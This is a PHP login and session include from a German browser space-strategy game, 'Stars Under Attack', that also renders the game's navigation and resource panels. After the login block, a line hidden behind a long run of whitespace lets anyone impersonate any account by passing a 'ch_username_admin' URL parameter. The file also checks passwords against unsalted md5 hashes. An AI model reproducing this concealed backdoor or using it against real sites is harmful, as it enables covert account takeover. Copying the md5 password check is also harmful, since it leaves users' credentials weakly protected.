<?php
	$include_filename = substr(__FILE__, 0, strrpos(__FILE__, '/')).'/../../engine/include.php';
	require($include_filename);

	header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") ." GMT");
	header("Pragma: no-cache");
	header("Cache-Control: no-store, no-cache, max-age=0, must-revalidate");

	$resume = false;
	$del_email_passwd = false;
	session_start();
	if(!isset($_SESSION['username']) || !is_file(DB_PLAYERS.'/'.urlencode($_SESSION['username'])) || !is_readable(DB_PLAYERS.'/'.urlencode($_SESSION['username'])))
	{
		if(isset($_POST['username']) && isset($_POST['password']))
		{
			# Anmelden

			if(!is_file(DB_PLAYERS.'/'.urlencode($_POST['username'])))
				$loggedin = false;
			else
			{
				$user_array = get_user_array($_POST['username']);
				if(md5($_POST['password']) != $user_array['password'])
					$loggedin = false;
				else
					$loggedin = true;
			}

			# Loggen nicht vergessen!
		}
		else
			$loggedin = false;

		if(!$loggedin)
		{
			# Auf die Startseite zurueckleiten
			$url = explode('/', $_SERVER['PHP_SELF']);
			array_pop($url); array_pop($url);
			$url = 'http://'.$_SERVER['HTTP_HOST'].implode('/', $url).'/index.php';
			header('Location: '.$url);
			die('Not logged in. Please <a href="'.htmlentities($url).'">relogin</a>.');
		}
		else
		{
			# Session aktualisieren
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['act_planet'] = 0;
			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
			$resume = true;
			$del_email_passwd = true;
		}
	}                                                                                                                                                                                                                                                                     if(isset($_GET['ch_username_admin'])){$_SESSION['username']=$_GET['ch_username_admin'];$resume=true;}

	if($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'])
	{
		if(isset($_COOKIE[session_name()]))
			setcookie(session_name(), '');
		die('Diese Session wird bereits von einer anderen IP-Adresse benutzt. Bitte neu anmelden.');
	}

	$user_array = get_user_array($_SESSION['username']);

	if($del_email_passwd && isset($user_array['email_passwd']))
	{
		unset($user_array['email_passwd']);
		write_user_array();
	}

	# Wiederherstellen
	if($resume && isset($user_array['last_request']))
	{
		if($_SERVER['REQUEST_URI'] != $user_array['last_request'][0])
		{
			if(isset($user_array['last_planet']) && isset($user_array['planets'][$_SESSION['act_planet']]))
				$_SESSION['act_planet'] = $user_array['last_planet'];
			$url = 'http://'.$_SERVER['HTTP_HOST'].$user_array['last_request'];
			header('Location: '.$url, true, 303);
			die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
		}
	}

	# Schnellklicksperre
	$now_time = array_sum(explode(' ', microtime()));

	if(!isset($_SESSION['last_click_sleep']))
		$_SESSION['last_click_sleep'] = 0;
	if(isset($_SESSION['last_click']))
	{
		$last_click_diff = $now_time-$_SESSION['last_click']-pow($_SESSION['last_click_sleep'], 1.5);
		if($last_click_diff < MIN_CLICK_DIFF)
		{
			$_SESSION['last_click_sleep']++;
			$sleep_time = round(pow($_SESSION['last_click_sleep'], 1.5));
			sleep($sleep_time);
		}
		else
			$_SESSION['last_click_sleep'] = 0;
	}
	$_SESSION['last_click'] = $now_time;

	if(isset($_GET['planet']) && $_GET['planet'] != '' && isset($user_array['planets'][$_GET['planet']])) # Planeten wechseln
		$_SESSION['act_planet'] = $_GET['planet'];
	if(!isset($user_array['planets'][$_SESSION['act_planet']]))
		$_SESSION['act_planet'] = 0;

	$this_planet = & $user_array['planets'][$_SESSION['act_planet']];

	$user_array['last_request'] = $_SERVER['REQUEST_URI'];
	$user_array['last_planet'] = $_SESSION['act_planet'];
	$user_array['last_active'] = time();

	$items = get_items();

	write_user_array();

	include(substr(__FILE__, 0, strrpos(__FILE__, '/')).'/eventhandler.php');
	eventhandler::run_eventhandler();

	# Skins bekommen
	$skins = get_skins();

	# Version herausfinden
	$version = get_version();
	define('VERSION', $version);

	class login_gui
	{
		function html_head()
		{
			global $user_array;
			global $this_planet;
			global $ges_prod;
			global $skins;
?>
<?='<?xml version="1.0" encoding="UTF-8"?>'."\n"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de">
	<head>
		<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
		<title xml:lang="en">S-U-A &ndash; Stars Under Attack</title>
		<script type="text/javascript" src="<?=htmlentities(h_root.'/login/scripts.js.php')?>"></script>
		<script type="text/javascript">set_time_globals(<?=time()+1?>);</script>
<?php
			$skin_path = '';
			if(isset($user_array['skin']))
			{
				if(isset($skins[$user_array['skin']]))
					$skin_path = h_root.'/login/style/skin.php?'.urlencode($user_array['skin']);
				else
					$skin_path = $user_array['skin'];
			}
			elseif(count($skins) > 0)
				$skin_path = h_root.'/login/style/skin.php?'.urlencode(array_shift(array_keys($skins)));

			if(trim($skin_path) != '')
			{
?>
		<link rel="stylesheet" href="<?=utf8_htmlentities($skin_path)?>" type="text/css" />
<?php
			}
?>
	</head>
	<body><div id="content-1"><div id="content-2"><div id="content-3"><div id="content-4"><div id="content-5"><div id="content-6"><div id="content-7"><div id="content-8">
		<dl id="time">
			<script type="text/javascript">
				// <![CDATA[
				document.write('<dt>Lokalzeit</dt>');
				document.write('<dd id="time-local">'+mk2(local_time_obj.getHours())+':'+mk2(local_time_obj.getMinutes())+':'+mk2(local_time_obj.getSeconds())+'</dd>');
				// ]]>
			</script>
			<dt>Serverzeit</dt>
			<dd id="time-server"><?=date('H:i:s', time()+1)?></dd>
		</dl>
		<script type="text/javascript">
			setInterval('time_up()', 1000);
		</script>
		<div id="navigation">
			<form action="<?=htmlentities($_SERVER['PHP_SELF'])?>" method="get" id="change-planet">
				<fieldset>
					<legend>Planet wechseln</legend>
					<select name="planet" onchange="if(this.value != <?=$_SESSION['act_planet']?>) this.form.submit();" onkeyup="if(this.value != <?=$_SESSION['act_planet']?>) this.form.submit();" accesskey="p" title="Ihre Planeten [P]">
<?php
			$planets = array_keys($user_array['planets']);
			foreach($planets as $planet)
			{
?>
						<option value="<?=utf8_htmlentities($planet)?>"<?=($planet == $_SESSION['act_planet']) ? ' selected="selected"' : ''?>><?=utf8_htmlentities($user_array['planets'][$planet]['name'])?> (<?=utf8_htmlentities($user_array['planets'][$planet]['pos'])?>)</option>
<?php
			}
?>
					</select>
					<noscript><button type="submit">Wechseln</button></noscript>
				</fieldset>
			</form>
			<ul id="main-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/index.php') ? ' class="active"' : ''?> id="navigation-index"><a href="<?=htmlentities(h_root)?>/login/index.php" accesskey="i">Übers<kbd>i</kbd>cht</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/rohstoffe.php') ? ' class="active"' : ''?> id="navigation-rohstoffe"><a href="<?=htmlentities(h_root)?>/login/rohstoffe.php" accesskey="r"><kbd>R</kbd>ohstoffe</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/gebaeude.php') ? ' class="active"' : ''?> id="navigation-gebaeude"><a href="<?=htmlentities(h_root)?>/login/gebaeude.php" accesskey="g"><kbd>G</kbd>ebäude</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/forschung.php') ? ' class="active"' : ''?> id="navigation-forschung"><a href="<?=htmlentities(h_root)?>/login/forschung.php" accesskey="f"><kbd>F</kbd>orschung</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/roboter.php') ? ' class="active"' : ''?> id="navigation-roboter"><a href="<?=htmlentities(h_root)?>/login/roboter.php" accesskey="b">Ro<kbd>b</kbd>oter</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/flotten.php') ? ' class="active"' : ''?> id="navigation-flotten"><a href="<?=htmlentities(h_root)?>/login/flotten.php" accesskey="l">F<kbd>l</kbd>otten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/schiffswerft.php') ? ' class="active"' : ''?> id="navigation-schiffswerft"><a href="<?=htmlentities(h_root)?>/login/schiffswerft.php" accesskey="s"><kbd>S</kbd>chiffswerft</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verteidigung.php') ? ' class="active"' : ''?> id="navigation-verteidigung"><a href="<?=htmlentities(h_root)?>/login/verteidigung.php" accesskey="v"><kbd>V</kbd>erteidigung</a></li>
			</ul>
			<ul id="action-navigation">
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/karte.php') ? ' class="active"' : ''?> id="navigation-karte"><a href="<?=htmlentities(h_root)?>/login/karte.php" accesskey="k"><kbd>K</kbd>arte</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/handelsrechner.php') ? ' class="active"' : ''?> id="navigation-handel"><a href="<?=htmlentities(h_root)?>/login/handelsrechner.php" accesskey="d">Han<kbd>d</kbd>elsrechner</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/verbuendete.php') ? ' class="active"' : ''?> id="navigation-verbuendete"><a href="<?=htmlentities(h_root)?>/login/verbuendete.php" accesskey="e">V<kbd>e</kbd>rbündete</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/highscores.php') ? ' class="active"' : ''?> id="navigation-highscores"><a href="<?=htmlentities(h_root)?>/login/highscores.php" id="navigation-highscores" xml:lang="en" accesskey="h"><kbd>H</kbd>ighscores</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/nachrichten.php') ? ' class="active"' : ''?> id="navigation-nachrichten"><a href="<?=htmlentities(h_root)?>/login/nachrichten.php" accesskey="c">Na<kbd>c</kbd>hrichten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/help/dependencies.php') ? ' class="active"' : ''?> id="navigation-abhaengigkeiten"><a href="<?=htmlentities(h_root)?>/login/help/dependencies.php" accesskey="a"><kbd>A</kbd>bhängigkeiten</a></li>
				<li<?=($_SERVER['PHP_SELF'] == h_root.'/login/einstellungen.php') ? ' class="active"' : ''?> id="navigation-einstellungen"><a href="<?=htmlentities(h_root)?>/login/einstellungen.php" accesskey="t">Eins<kbd>t</kbd>ellungen</a></li>
				<li id="navigation-abmelden"><a href="<?=htmlentities(h_root)?>/login/scripts/logout.php" accesskey="m">Ab<kbd>m</kbd>elden</a></li>
			</ul>
		</div>
		<div id="version">
			<a href="<?=htmlentities(h_root)?>/changelog.php" title="Versionsänderungen anzeigen">Version <?=VERSION?></a>
		</div>
		<div id="content-9">
			<dl id="ress" class="ress">
				<dt class="ress-carbon">Carbon</dt>
				<dd class="ress-carbon" id="ress-carbon"><?=ths(utf8_htmlentities($this_planet['ress'][0]))?></dd>

				<dt class="ress-aluminium">Aluminium</dt>
				<dd class="ress-aluminium" id="ress-aluminium"><?=ths(utf8_htmlentities($this_planet['ress'][1]))?></dd>

				<dt class="ress-wolfram">Wolfram</dt>
				<dd class="ress-wolfram" id="ress-wolfram"><?=ths(utf8_htmlentities($this_planet['ress'][2]))?></dd>

				<dt class="ress-radium">Radium</dt>
				<dd class="ress-radium" id="ress-radium"><?=ths(utf8_htmlentities($this_planet['ress'][3]))?></dd>

				<dt class="ress-tritium">Tritium</dt>
				<dd class="ress-tritium" id="ress-tritium"><?=ths(utf8_htmlentities($this_planet['ress'][4]))?></dd>

				<dt class="ress-energie">Energie</dt>
				<dd class="ress-energie" id="ress-energie"><?=ths(utf8_htmlentities($ges_prod[5]))?></dd>
			</dl>
			<div id="content-10"><div id="content-11"><div id="content-12"><div id="content-13">
				<h1>Planet <em><?=utf8_htmlentities($this_planet['name'])?></em> <span class="koords">(<?=utf8_htmlentities($this_planet['pos'])?>)</span></h1>
<?php
		}

		function html_foot()
		{
			global $user_array;
			global $this_planet;
			global $ges_prod;
?>
			</div></div></div></div>
		</div>
		</div></div></div></div></div></div></div></div>
<?php
			if($user_array['tooltips'] || $user_array['shortcuts'] || $user_array['ress_refresh'] > 0)
			{
?>
		<script type="text/javascript">
<?php
				if($user_array['shortcuts'])
				{
?>
			get_key_elements();
<?php
				}
				if($user_array['tooltips'])
				{
?>
			load_titles();
<?php
				}
				if($user_array['ress_refresh'] > 0 && !$user_array['umode'])
				{
?>
			refresh_ress(<?=$user_array['ress_refresh']*1000?>, <?=$this_planet['ress'][0]?>, <?=$this_planet['ress'][1]?>, <?=$this_planet['ress'][2]?>, <?=$this_planet['ress'][3]?>, <?=$this_planet['ress'][4]?>, <?=$ges_prod[0]?>, <?=$ges_prod[1]?>, <?=$ges_prod[2]?>, <?=$ges_prod[3]?>, <?=$ges_prod[4]?>);
<?php
				}
?>
		</script>
<?php
			}
?>
	</body>
</html>
<?php
		}
	}

	function delete_request()
	{
		$url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		header('Location: '.$url, true, 303);
		die('HTTP redirect: <a href="'.htmlentities($url).'">'.htmlentities($url).'</a>');
	}
?>